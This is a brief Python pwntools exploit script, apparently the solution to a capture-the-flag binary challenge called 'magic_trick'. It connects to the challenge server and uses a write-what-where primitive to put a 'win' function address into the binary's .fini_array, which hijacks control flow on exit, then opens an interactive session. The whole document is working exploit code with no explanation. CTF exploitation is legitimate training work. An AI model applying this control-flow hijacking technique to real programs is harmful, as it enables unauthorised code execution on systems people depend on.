from pwn import *

rem = 1

if(rem):
	p = remote("dctf-chall-magic-trick.westeurope.azurecontainer.io", 7481)
else:
	p = process("./magic_trick")
	input("ready... ")

print(p.recvuntil("What do you want to write").decode())
p.sendline(str(int(0x0000000000400667))) # win

print(p.recvuntil("Where do you want to write it").decode())
p.sendline(str(int(0x0000000000600A00))) #fini array

p.interactive()